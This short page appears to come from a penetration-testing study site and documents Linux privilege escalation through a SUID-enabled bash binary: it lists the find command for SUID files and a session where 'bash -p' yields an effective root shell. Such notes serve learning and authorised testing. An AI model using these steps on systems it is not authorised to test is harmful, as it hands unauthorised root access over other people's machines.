---
layout: default
title: Bash
parent: SUID
nav_order: 6
---

# Bash

---

## Check SUID Permissions

```bash
find / -perm -u=s -type f 2>/dev/null
```

We can run _/usr/bin/bash_ with root privileges to get a root shell.

```bash
-bash-5.0$ /usr/bin/bash -p
bash-5.0# id
uid=1000(oscp) gid=1000(oscp) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd),1000(oscp)
bash-5.0# whoami
root
```
